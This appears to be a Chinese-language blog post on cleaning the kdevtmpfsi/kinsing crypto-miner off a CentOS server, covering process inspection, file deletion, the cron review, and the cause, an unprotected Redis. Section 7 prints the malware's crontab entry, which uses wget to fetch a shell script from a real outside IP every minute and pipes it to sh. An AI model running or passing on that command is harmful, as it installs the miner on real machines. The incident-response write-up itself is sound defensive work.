---
layout: post
title: kdevtmpfsi挖矿病毒处理
categories: Security
description: kdevtmpfsi挖矿病毒处理
keywords: kdevtmpfsi, 挖矿, 病毒
---

### 1. 发现cpu使用率异常
```shell
top - 10:02:36 up 5 days, 12:28,  9 users,  load average: 2.86, 2.66, 2.62
Tasks: 203 total,   2 running, 198 sleeping,   2 stopped,   1 zombie
%Cpu(s): 97.5 us,  2.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st
KiB Mem :  8009128 total,   132612 free,  5849780 used,  2026736 buff/cache
KiB Swap:  4194300 total,  3559272 free,   635028 used.  1238868 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND          
17570 xyd       20   0 2717468   2.3g    132 S 184.7 29.7   4517:52 kdevtmpfsi       
16612 oracle    20   0 1900772 116884 111248 S   7.3  1.5   5:18.53 oracle_16612_or  
 1627 root      20   0  160064   2356   1556 R   0.7  0.0   0:00.02 top              
 1885 oracle    -2   0 1892612   1544   1300 S   0.7  0.0  65:00.73 ora_vktm_orcl    
 1282 root      20   0  574204    880    304 S   0.3  0.0   0:33.91 tuned            
 1563 root      20   0  156800   5456   4136 S   0.3  0.1   0:00.15 sshd             
 1889 oracle    20   0 1894444  26504  24184 S   0.3  0.3   0:29.05 ora_gen0_orcl    
 9683 xyd       20   0 3687996 510496   5084 S   0.3  6.4 141:49.73 java             
21867 xyd       20   0 4515132 392080  11840 S   0.3  4.9   0:17.97 java             
32413 root      20   0  159928   2288   1556 S   0.3  0.0   0:00.56 top              
```
## 2. 查看进程状态
```shell
[root@VM_0_5_centos spool]# systemctl status 17570 -l
● session-16756.scope - Session 16756 of user xyd
   Loaded: loaded (/run/systemd/system/session-16756.scope; static; vendor preset: di
sabled)  Drop-In: /run/systemd/system/session-16756.scope.d
           └─50-After-systemd-logind\x2eservice.conf, 50-After-systemd-user-sessions\
x2eservice.conf, 50-Description.conf, 50-SendSIGHUP.conf, 50-Slice.conf, 50-TasksMax.conf   Active: active (abandoned) since Thu 2020-09-17 10:46:01 CST; 3h 36min ago
   CGroup: /user.slice/user-1001.slice/session-16756.scope
           ├─17261 /var/tmp/kinsing
           └─17570 /tmp/kdevtmpfsi

Sep 17 10:58:35 VM_0_5_centos crontab[17334]: (xyd) REPLACE (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17335]: (xyd) LIST (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17338]: (xyd) LIST (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17344]: (xyd) LIST (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17349]: (xyd) REPLACE (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17353]: (xyd) REPLACE (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17354]: (xyd) LIST (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17359]: (xyd) REPLACE (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17362]: (xyd) REPLACE (xyd)
Sep 17 10:58:35 VM_0_5_centos crontab[17365]: (xyd) REPLACE (xyd)

```
## 3.查看进程
```shell
[root@VM_0_5_centos tmp]# ps -ef | grep kinsing
root      4719  3234  0 10:14 pts/10   00:00:00 grep --color=auto kinsing
xyd      17570     1  0 Sep15 ?        00:00:15 /var/tmp/kinsing
[root@VM_0_5_centos tmp]# ps -aux | grep kdevtmpfsi
xyd      17261  181 29.9 2721444 2397832 ?     Ssl  10:03  19:05 /tmp/kdevtmpfsi
root      4754  0.0  0.0 112712   968 pts/10   R+   10:14   0:00 grep --color=auto kd
```
## 4. 删除病毒文件
```shell
[root@VM_0_5_centos tmp]# cd /tmp
[root@VM_0_5_centos tmp]# rm -rf kdevtmpfsi 
[root@VM_0_5_centos tmp]# cd /var/tmp/
[root@VM_0_5_centos tmp]# rm -rf kinsing 
```
## 5. 强制结束进程
```shell
[root@VM_0_5_centos tmp]# kill -9 17570
[root@VM_0_5_centos tmp]# kill -9 17261
[root@VM_0_5_centos tmp]# ps -aux | grep kdevtmpfsi
root      4798  0.0  0.0 112712   968 pts/10   R+   10:14   0:00 grep --color=auto kd
[root@VM_0_5_centos tmp]# ps -ef | grep kinsing
root      4809  3234  0 10:14 pts/10   00:00:00 grep --color=auto kinsing
```
## 6. CPU使用率回复正常
```shell
[root@VM_0_5_centos tmp]# top
top - 10:15:40 up 5 days, 12:41, 11 users,  load average: 1.10, 2.26, 2.45
Tasks: 209 total,   1 running, 205 sleeping,   2 stopped,   1 zombie
%Cpu(s):  5.0 us,  0.7 sy,  0.0 ni, 94.3 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :  8009128 total,  2707516 free,  3333520 used,  1968092 buff/cache
KiB Swap:  4194300 total,  3587176 free,   607124 used.  3752744 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND          
16612 oracle    20   0 1900772 125332 119696 S   8.7  1.6   6:18.04 oracle_16612_or  
 1885 oracle    -2   0 1892612   1544   1300 S   1.0  0.0  65:06.96 ora_vktm_orcl    
 9683 xyd       20   0 3687996 510496   5084 S   0.7  6.4 141:52.59 java             
  825 xyd       20   0 4647912 936628   6724 S   0.3 11.7   2:07.13 java             
 2490 root      20   0 1198968   7744   1500 S   0.3  0.1  25:29.27 barad_agent      
 4348 xyd       20   0 4596816 864808  13804 S   0.3 10.8   0:31.54 java             
25987 xyd       20   0  808740  45688  14964 S   0.3  0.6   0:03.93 npm              
```
## 7. 查看定时任务
> CentOS定时任务涉及到的地方比较多，需要每个地方都查一下

- `crontab -l`
	- `crontab -e`
	- 无发现

- `/etc/rc.d/rc.local`
	- 无发现
- `/var/spool/cron/`
	- 发现定时任务文件`xyd`，删除，重启服务
	
```shell
[root@VM_0_5_centos cron]# cat xyd
* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
[root@VM_0_5_centos cron]# rm -rf xyd
[root@VM_0_5_centos cron]# systemctl restart crond.service
```


- `chkconfig --list`
	- 无发现

## 8. 残留清理
> [https://developer.aliyun.com/article/741844](http://https://developer.aliyun.com/article/741844 "https://developer.aliyun.com/article/741844")

根据上述分析，删除残留文件

```shell
[root@VM_0_5_centos redis-4.0.11]# ls -al
total 39068
drwxrwxr-x  6 xyd  xyd      4096 Sep 17 14:35 .
drwxrwxr-x  3 xyd  xyd      4096 Sep 11 20:33 ..
-rw-r--r--  1 root root    55664 Sep 12 12:47 red2.so
[root@VM_0_5_centos redis-4.0.11]# rm -rf red2.so
[root@VM_0_5_centos ~]# find / -name kdevtmpfsi
[root@VM_0_5_centos ~]# find / -name kinsing
```
## 9. 原因分析
开发人员部署redis测试服务，未修改默认端口，未设置密码，修改配置及增加口令后恢复正常。

